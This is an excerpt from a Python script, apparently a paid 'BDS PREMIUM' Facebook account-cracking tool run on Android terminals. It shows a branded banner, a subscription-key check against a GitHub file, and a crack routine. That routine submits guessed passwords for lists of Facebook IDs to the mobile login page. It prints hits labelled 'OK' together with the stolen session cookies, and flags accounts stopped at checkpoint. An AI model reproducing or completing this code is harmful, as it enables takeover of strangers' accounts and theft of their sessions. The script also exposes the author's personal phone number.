...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 9; itel L6005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.20 Mobile Safari/537.36 OPR/64.2.3282.60128",]
...
os.system('espeak -a 300 " Welcome,   to,  BDS,  PREMIUM,  Tools"')
os.system('xdg-open https://github.com/Cyber-404ibrahim')
def banner():
	os.system("clear")
	print (f"""     
...
\033[41m \033[1;37m           [ibrahim]               \x1b[0m
\033[1;32m┌───────────────────────────────────────┐   
\033[1;33m│ [✓] Admin   : ibrahim\033[1;32m       │
\033[1;34m│ [✓] Github  :\033[41m\033[1;37mibrahim\x1b[0m                 │
\033[1;35m│ [✓] Whtsapp : 01611590876             │
\033[1;36m│ [✓] Youtube : \x1b[1;32mibrahim\x1b[1;97m            │               
\033[1;32m└───────────────────────────────────────┘   
\033[1;94m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══
\033[1;97m Status : \033[38;5;46mpid
\033[1;94m═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━══  """)
def login():
	banner()
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN BDS\n\x1b[1;97m [1] METHOD BDS ')
	os.system('espeak -a 300 " 1,  method,  BDS"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def passwrd():
	os.system('clear')
	banner()
	print(f"\033[97;1m[\033[92;1m+\033[97;1m]\033[1;92mIBRAHIM\033[1;91m :\033[1;96m "+NameX)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[CPX-7] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
    ...
    'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfcA2bhP3PUtBfOXGxLzCDXd1CdfJ-Sm11djkSjZe84bx2W91cmrT6ds0Ws_eN9cVWVoIha33YjTHY56RwBk_omuJyBSoIPhe-u4ZXjUOJnT2w&smuh=63717&lh=Ac_etnbDhYRbC6I99tk&wtsid=rdr_0VsPJPADEeT5RtZ0X&refid=8&ref_component=mbasic_footer&_rdr',
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Tutul-King
				print(f'\r\033[0;91m[{time.strftime("%H:%M")}•bds-Cp] {idf} • {pw}')     
				...
				#Tutul-King
				print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}•BDS-OK] {idf} • {pw}\n\033[0;91m[💋]= COOKIES • \033[38;5;46m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	r1=requests.get("https://github.com/Cyber-404ibrahim/Txt2/blob/main/Txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		os.system("clear")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[38;5;46m FREE USER NOT COME INBOX")
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Bds+key1)
		...
		os.system('am start https://wa.me/+8801611590876?text=' + tks)
		Subscraption()  
login()